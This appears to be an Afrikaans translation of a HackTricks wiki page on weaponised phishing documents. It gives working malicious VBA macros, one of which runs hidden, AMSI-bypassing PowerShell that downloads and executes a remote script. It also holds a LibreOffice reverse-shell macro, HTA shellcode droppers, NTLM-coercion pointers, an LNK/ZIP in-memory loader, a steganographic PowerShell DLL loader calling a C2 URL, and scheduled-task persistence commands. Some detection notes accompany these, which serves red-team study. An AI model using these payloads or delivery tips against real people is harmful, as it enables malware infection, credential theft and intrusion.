# Phishing-lêers & Dokumente

{{#include ../../banners/hacktricks-training.md}}

## Kantoordokumente

Microsoft Word voer lêerdatavalidering uit voordat ’n lêer oopgemaak word. Datavalidering word uitgevoer in die vorm van datastruktuur-identifikasie, volgens die OfficeOpenXML-standaard. Indien enige fout tydens die datastruktuur-identifikasie voorkom, sal die lêer wat ontleed word nie oopgemaak word nie.

Gewoonlik gebruik Word-lêers wat makro’s bevat die `.docm`-uitbreiding. Dit is egter moontlik om die lêer te hernoem deur die lêeruitbreiding te verander en steeds hul makro-uitvoeringsvermoëns te behou.\
Byvoorbeeld, ’n RTF-lêer ondersteun nie makro’s nie, volgens ontwerp, maar ’n DOCM-lêer wat na RTF hernoem is, sal deur Microsoft Word hanteer word en sal makro-uitvoering kan uitvoer.\
Dieselfde interne strukture en meganismes is van toepassing op alle sagteware in die Microsoft Office Suite (Excel, PowerPoint, ens.).

Jy kan die volgende opdrag gebruik om te kontroleer watter uitbreidings deur sommige Office-programme uitgevoer gaan word:
```bash
assoc | findstr /i "word excel powerp"
```
DOCX-lêers wat na ’n afgeleë template verwys (File –Options –Add-ins –Manage: Templates –Go) en makros insluit, kan makros ook “uitvoer”.

### Eksterne beeldlaai

Gaan na: _Insert --> Quick Parts --> Field_\
_**Categories**: Links and References, **Field names**: includePicture, en **Filename or URL**:_ http://<ip>/whatever

![Office Documents - Eksterne beeldlaai: Gaan na: Insert -- Quick Parts -- Field](<../../images/image (155).png>)

### Makro-agterdeur

Dit is moontlik om makros te gebruik om arbitrêre kode vanaf die dokument uit te voer.

#### Outolaai-funksies

Hoe meer algemeen hulle is, hoe waarskynliker is dit dat die AV hulle sal opspoor.

- AutoOpen()
- Document_Open()

#### Voorbeelde van makrokode
```vba
Sub AutoOpen()
CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
End Sub
```

```vba
Sub AutoOpen()

Dim Shell As Object
Set Shell = CreateObject("wscript.shell")
Shell.Run "calc"

End Sub
```

```vba
Dim author As String
author = oWB.BuiltinDocumentProperties("Author")
With objWshell1.Exec("powershell.exe -nop -Windowsstyle hidden -Command-")
.StdIn.WriteLine author
.StdIn.WriteBlackLines 1
```

```vba
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell <beacon line generated>
```
#### Verwyder metadata handmatig

Gaan na **File > Info > Inspect Document > Inspect Document**, wat die Document Inspector sal oopmaak. Klik **Inspect** en dan **Remove All** langs **Document Properties and Personal Information**.

#### Doc-uitbreiding

Wanneer jy klaar is, kies die **Save as type**-aftreklys en verander die formaat van **`.docx`** na **Word 97-2003 `.doc`**.\
Doen dit omdat jy **nie macro's binne 'n `.docx` kan stoor nie** en daar 'n **stigma** **rondom** die macro-geaktiveerde **`.docm`**-uitbreiding is (die thumbnail-ikoon het byvoorbeeld 'n groot `!`, en sommige web-/e-posgateways blokkeer dit heeltemal). Daarom is hierdie **legacy `.doc`-uitbreiding die beste kompromie**.

#### Malicious Macros Generators

- MacOS
- [**macphish**](https://github.com/cldrn/macphish)
- [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)

## LibreOffice ODT outomatiese-uitvoering-macros (Basic)

LibreOffice Writer-dokumente kan Basic-macros insluit en dit outomaties uitvoer wanneer die lêer oopgemaak word deur die macro aan die **Open Document**-gebeurtenis te bind (Tools → Customize → Events → Open Document → Macro…).<sup>[[1]](#references)</sup> 'n Eenvoudige reverse shell-macro lyk soos volg:
```vb
Sub Shell
Shell("cmd /c powershell -enc BASE64_PAYLOAD"""")
End Sub
```
Let op die dubbele aanhalingstekens (`""`) binne die string – LibreOffice Basic gebruik dit om letterlike aanhalingstekens te ontsnap, sodat payloads wat met `...==""")` eindig, beide die binneste opdrag en die Shell-argument gebalanseerd hou.

Afleweringswenke:

- Stoor as `.odt` en koppel die macro aan die dokumentgebeurtenis sodat dit onmiddellik loop wanneer dit oopgemaak word.
- Wanneer jy met `swaks` e-pos stuur, gebruik `--attach @resume.odt` (die `@` is vereis sodat die lêergrepe, nie die lêernaamstring nie, as die aanhegsel gestuur word). Dit is krities wanneer SMTP-bedieners misbruik word wat arbitrêre `RCPT TO`-ontvangers sonder validering aanvaar.

## HTA-lêers

’n HTA is ’n Windows-program wat **HTML en skriptale (soos VBScript en JScript) kombineer**. Dit genereer die gebruikerskoppelvlak en word as ’n "fully trusted"-toepassing uitgevoer, sonder die beperkings van ’n blaaier se sekuriteitsmodel.

’n HTA word met **`mshta.exe`** uitgevoer, wat tipies saam met **Internet Explorer** geïnstalleer word, wat **`mshta` afhanklik van IE** maak. Indien dit dus gedeïnstalleer is, sal HTAs nie kan uitvoer nie.
```html
<--! Basic HTA Execution -->
<html>
<head>
<title>Hello World</title>
</head>
<body>
<h2>Hello World</h2>
<p>This is an HTA...</p>
</body>

<script language="VBScript">
Function Pwn()
Set shell = CreateObject("wscript.Shell")
shell.run "calc"
End Function

Pwn
</script>
</html>
```

```html
<--! Cobal Strike generated HTA without shellcode -->
<script language="VBScript">
Function var_func()
var_shellcode = "<shellcode>"

Dim var_obj
Set var_obj = CreateObject("Scripting.FileSystemObject")
Dim var_stream
Dim var_tempdir
Dim var_tempexe
Dim var_basedir
Set var_tempdir = var_obj.GetSpecialFolder(2)
var_basedir = var_tempdir & "\" & var_obj.GetTempName()
var_obj.CreateFolder(var_basedir)
var_tempexe = var_basedir & "\" & "evil.exe"
Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
For i = 1 to Len(var_shellcode) Step 2
var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
Next
var_stream.Close
Dim var_shell
Set var_shell = CreateObject("Wscript.Shell")
var_shell.run var_tempexe, 0, true
var_obj.DeleteFile(var_tempexe)
var_obj.DeleteFolder(var_basedir)
End Function

var_func
self.close
</script>
```
## NTLM-verifikasie afdwing

Daar is verskeie maniere om **NTLM-verifikasie "op afstand" af te dwing**. Jy kan byvoorbeeld **onsigbare beelde** by e-posse of HTML voeg waartoe die gebruiker toegang sal verkry (selfs HTTP MitM?). Of stuur die slagoffer die **adres van lêers** wat ’n **verifikasie** sal **aktiveer** bloot deur die **lêergids oop te maak.**

**Kyk na hierdie idees en meer op die volgende bladsye:**


{{#ref}}
../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
{{#endref}}


{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### NTLM Relay

Moenie vergeet dat jy nie net die hash of die verifikasie kan steel nie, maar ook **NTLM relay-aanvalle kan uitvoer**:

- [**NTLM Relay attacks**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
- [**AD CS ESC8 (NTLM relay to certificates)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)

## LNK-laaiers + ZIP-ingebedde payloads (fileless-ketting)

Hoogs effektiewe veldtogte lewer ’n ZIP wat twee wettige lokdokumente (PDF/DOCX) en ’n kwaadwillige .lnk bevat. Die truuk is dat die werklike PowerShell-loader binne die ZIP se rou grepe ná ’n unieke merker gestoor word, en die .lnk dit uitsny en volledig in die geheue uitvoer.<sup>[[2]](#references)</sup>

Tipiese vloei wat deur die .lnk PowerShell one-liner geïmplementeer word:

1) Vind die oorspronklike ZIP in algemene paaie: Desktop, Downloads, Documents, %TEMP%, %ProgramData%, en die ouergids van die huidige werkgids.
2) Lees die ZIP-grepe en vind ’n hardgekodeerde merker (bv. xFIQCV). Alles ná die merker is die ingebedde PowerShell-payload.
3) Kopieer die ZIP na %ProgramData%, pak dit daar uit, en maak die lok-.docx oop om wettig voor te kom.
4) Omseil AMSI vir die huidige proses: [System.Management.Automation.AmsiUtils]::amsiInitFailed = $true
5) Deobfuskeer die volgende stadium (bv. verwyder alle #-karakters) en voer dit in die geheue uit.

Voorbeeld van ’n PowerShell-raamwerk om die ingebedde stadium uit te sny en uit te voer:
```powershell
$marker   = [Text.Encoding]::ASCII.GetBytes('xFIQCV')
$paths    = @(
"$env:USERPROFILE\Desktop", "$env:USERPROFILE\Downloads", "$env:USERPROFILE\Documents",
"$env:TEMP", "$env:ProgramData", (Get-Location).Path, (Get-Item '..').FullName
)
$zip = Get-ChildItem -Path $paths -Filter *.zip -ErrorAction SilentlyContinue -Recurse | Sort-Object LastWriteTime -Descending | Select-Object -First 1
if(-not $zip){ return }
$bytes = [IO.File]::ReadAllBytes($zip.FullName)
$idx   = [System.MemoryExtensions]::IndexOf($bytes, $marker)
if($idx -lt 0){ return }
$stage = $bytes[($idx + $marker.Length) .. ($bytes.Length-1)]
$code  = [Text.Encoding]::UTF8.GetString($stage) -replace '#',''
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
Invoke-Expression $code
```
Notas
- Delivery misbruik dikwels betroubare PaaS-subdomeine (bv. *.herokuapp.com) en kan payloads beperk (bedien onskadelike ZIP-lêers gebaseer op IP/UA).
- Die volgende stage dekripteer gereeld base64/XOR shellcode en voer dit uit via Reflection.Emit + VirtualAlloc om disk artifacts te minimaliseer.

Persistence wat in dieselfde chain gebruik word
- COM TypeLib hijacking van die Microsoft Web Browser control sodat IE/Explorer of enige toepassing wat dit embed, die payload outomaties herbegin.<sup>[[2]](#references)[[4]](#references)</sup> Sien besonderhede en gereed-vir-gebruik commands hier:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/com-hijacking.md
{{#endref}}

Hunting/IOCs
- ZIP-lêers wat die ASCII-markerstring (bv. xFIQCV) bevat wat aan die archive data geheg is.
- .lnk wat parent/user-folders enumereer om die ZIP op te spoor en ’n decoy-dokument oopmaak.
- AMSI-tampering via [System.Management.Automation.AmsiUtils]::amsiInitFailed.
- Langlopende business threads wat eindig met links wat onder trusted PaaS-domains gehuisves word.

## LNK decoy-first staging → scheduled-task persistence → trusted CPL side-loading

Nog ’n herhalende patroon is ’n **document-impersonating `.lnk`** wat onmiddellik ’n onskadelike lure oopmaak terwyl dit die werklike chain in die agtergrond stage.<sup>[[3]](#references)</sup>

Waargenome workflow:
1. Die shortcut **doen hom voor as ’n PDF** en gebruik `conhost.exe` of ’n soortgelyke proxy om ’n obfuscated PowerShell downloader te spawn.
2. Die PowerShell fragmenteer ooglopende tokens (`iw''r`, `g''c''i`, `r''e''n`, `c''p''i`, `&(g''cm sch*)`) sodat naïewe detections wat na `iwr`, `gci`, `ren`, `cpi` of `schtasks` soek, die command mis.
3. Die stager download eers die **decoy-dokument**, maak dit vir die victim oop, en reconstrueer daarna die malicious files in die agtergrond.
4. Payloads kan met **junk extensions** geskryf en daarna hernoem word deur filler characters te verwyder, wat die verskyning van ooglopende `.exe` / `.cpl` artifacts vertraag.
5. Persistence word gevestig met ’n **minute-based scheduled task** wat ’n trusted host binary vanaf ’n user-writable path launch.

Minimale hunting clues uit hierdie patroon:
```powershell
# Suspicious split-token PowerShell seen in LNK chains
iw''r
r''e''n
&(g''cm sch*) /create /Sc minute /tn GoogleErrorReport /tr "$env:PUBLIC\Fondue"
```
'n Nuttige staging-uitleg om te herken is:
- `C:\Users\Public\<decoy>.pdf`
- `C:\Users\Public\<trusted>.exe`
- `C:\Users\Public\<malicious>.cpl` of `.dll`
- `C:\Windows\Tasks\<blob>.dat`

### Waarom die tweede stage stealthy is

In die Rapid7-gevallestudie het die scheduled task herhaaldelik **`Fondue.exe`** vanaf `C:\Users\Public\` geloods. Omdat **`APPWIZ.cpl`** langsaan gestage is en **`RunFODW`** geëksporteer het, het die trusted Microsoft-binary die aanvaller se CPL geside-load in plaas van die legitieme system copy.

Die CPL:
- Lees 'n **AES-256-CBC** blob vanaf `C:\Windows\Tasks\editor.dat`
- Decrypt dit deur **Windows CNG / `bcrypt.dll`**
- Allokeer executable memory en kopieer die decrypted shellcode
- Voer dit indirek uit deur die shellcode pointer as die callback vir **`EnumUILanguagesW`** deur te gee

Daardie laaste stap is afsonderlik die moeite werd om te hunt: malware vermy dikwels 'n direkte `((void(*)())buf)()`-jump en misbruik eerder 'n **legitimate callback-taking WinAPI** om uitvoering oor te dra.

Die decrypted payload in hierdie campaign was **Donut** shellcode, wat daarna die finale PE volledig in memory gemap het en **AMSI/WLDP/ETW** in die huidige process gepatch het voordat dit uitvoering oorgedra het. Vir dieper notas oor side-loading en memory-resident post-processing, sien:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/dll-hijacking/README.md
{{#endref}}

{{#ref}}
../../windows-hardening/av-bypass.md
{{#endref}}

Praktiese hunting-pivots:
- `.lnk` wat `powershell.exe` of `conhost.exe` spawn, gevolg deur 'n sigbare decoy-dokument.
- Kortstondige downloads na **`C:\Users\Public\`**, gevolg deur onmiddellike hernoemings vanaf onsinnige extensions.
- Scheduled tasks met onopvallende name soos `GoogleErrorReport` wat vanaf **user-writable directories** uitgevoer word.
- Trusted binaries wat **`.cpl` / `.dll`**-lêers vanaf dieselfde non-system directory laai.
- Base64-teksblobs wat onder **`C:\Windows\Tasks\`** geskryf en daarna deur die side-loaded module gelees word.

## Steganography-delimited payloads in images (PowerShell stager)

Onlangse loader chains lewer 'n obfuscated JavaScript/VBS wat 'n Base64 PowerShell stager decode en uitvoer. Daardie stager download 'n image (dikwels GIF) wat 'n Base64-encoded .NET DLL as plain text tussen unieke begin/eind-markers bevat. Die script soek hierdie delimiters (voorbeelde wat in die wild gesien is: «<<sudo_png>> … <<sudo_odt>>>»), ekstraheer die teks tussenin, Base64-decode dit na bytes, laai die assembly in-memory en invoke 'n bekende entry method met die C2 URL.<sup>[[5]](#references)</sup>

Workflow
- Stage 1: Archived JS/VBS dropper → decode embedded Base64 → launch PowerShell stager met -nop -w hidden -ep bypass.
- Stage 2: PowerShell stager → download image, carve marker-delimited Base64, laai die .NET DLL in-memory en call sy method (bv. VAI) terwyl die C2 URL en options deurgegee word.
- Stage 3: Loader retrieve die finale payload en inject dit tipies via process hollowing in 'n trusted binary (gewoonlik MSBuild.exe).<sup>[[7]](#references)[[8]](#references)</sup> Sien meer oor process hollowing en trusted utility proxy execution hier:

{{#ref}}
../../reversing/common-api-used-in-malware.md
{{#endref}}

PowerShell-voorbeeld om 'n DLL uit 'n image te carve en 'n .NET method in-memory te invoke:

<details>
<summary>PowerShell stego payload extractor and loader</summary>
```powershell
# Download the carrier image and extract a Base64 DLL between custom markers, then load and invoke it in-memory
param(
[string]$Url    = 'https://example.com/payload.gif',
[string]$StartM = '<<sudo_png>>',
[string]$EndM   = '<<sudo_odt>>',
[string]$EntryType = 'Loader',
[string]$EntryMeth = 'VAI',
[string]$C2    = 'https://c2.example/payload'
)
$img = (New-Object Net.WebClient).DownloadString($Url)
$start = $img.IndexOf($StartM)
$end   = $img.IndexOf($EndM)
if($start -lt 0 -or $end -lt 0 -or $end -le $start){ throw 'markers not found' }
$b64 = $img.Substring($start + $StartM.Length, $end - ($start + $StartM.Length))
$bytes = [Convert]::FromBase64String($b64)
$asm = [Reflection.Assembly]::Load($bytes)
$type = $asm.GetType($EntryType)
$method = $type.GetMethod($EntryMeth, [Reflection.BindingFlags] 'Public,Static,NonPublic')
$null = $method.Invoke($null, @($C2, $env:PROCESSOR_ARCHITECTURE))
```
</details>

Notas
- Dit is ATT&CK T1027.003 (steganography/marker-hiding).<sup>[[6]](#references)</sup> Merkers verskil tussen veldtogte.
- AMSI/ETW bypass en string deobfuscation word algemeen toegepas voordat die assembly gelaai word.
- Opsporing: skandeer afgelaaide beelde vir bekende delimiters; identifiseer PowerShell wat toegang tot beelde verkry en onmiddellik Base64-blobs dekodeer.

Sien ook stego-gereedskap en carving-tegnieke:

{{#ref}}
../../stego/workflow/README.md#quick-triage-checklist-first-10-minutes
{{#endref}}

## JS/VBS droppers → Base64 PowerShell staging

'n Herhalende aanvanklike stadium is 'n klein, sterk-geobfuskeerde `.js` of `.vbs` wat binne 'n argief afgelewer word. Die enigste doel daarvan is om 'n ingebedde Base64-string te dekodeer en PowerShell met `-nop -w hidden -ep bypass` te begin om die volgende stadium oor HTTPS te inisialiseer.<sup>[[5]](#references)</sup>

Skedel-logika (abstrak):
- Lees die inhoud van die eie lêer
- Vind 'n Base64-blob tussen gemorsstringe
- Dekodeer na ASCII PowerShell
- Voer uit met `wscript.exe`/`cscript.exe` wat `powershell.exe` aanroep

Opsporingsaanwysers
- Geargiveerde JS/VBS-aanhegsels wat `powershell.exe` begin met `-enc`/`FromBase64String` in die command line.
- `wscript.exe` wat `powershell.exe -nop -w hidden` vanuit gebruiker-temp-paaie begin.

## Windows-lêers om NTLM-hashes te steel

Kyk na die bladsy oor **plekke om NTLM-creds te steel**:

{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}


## Verwysings

- [1] [HTB Job – LibreOffice macro → IIS webshell → GodPotato](https://0xdf.gitlab.io/2026/01/26/htb-job.html)
- [2] [Check Point Research – ZipLine Campaign: A Sophisticated Phishing Attack Targeting US Companies](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [3] [Rapid7 – Malware à la Mode: Tracking Dropping Elephant Tradecraft Through a China-Themed Loader Chain](https://www.rapid7.com/blog/post/tr-malware-tracking-dropping-elephant-tradecraft-china-themed-loader-chain)
- [4] [Hijack the TypeLib – New COM persistence technique (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [5] [Unit 42 – PhantomVAI Loader Delivers a Range of Infostealers](https://unit42.paloaltonetworks.com/phantomvai-loader-delivers-infostealers/)
- [6] [MITRE ATT&CK – Steganography (T1027.003)](https://attack.mitre.org/techniques/T1027/003/)
- [7] [MITRE ATT&CK – Process Hollowing (T1055.012)](https://attack.mitre.org/techniques/T1055/012/)
- [8] [MITRE ATT&CK – Trusted Developer Utilities Proxy Execution: MSBuild (T1127.001)](https://attack.mitre.org/techniques/T1127/001/)

{{#include ../../banners/hacktricks-training.md}}
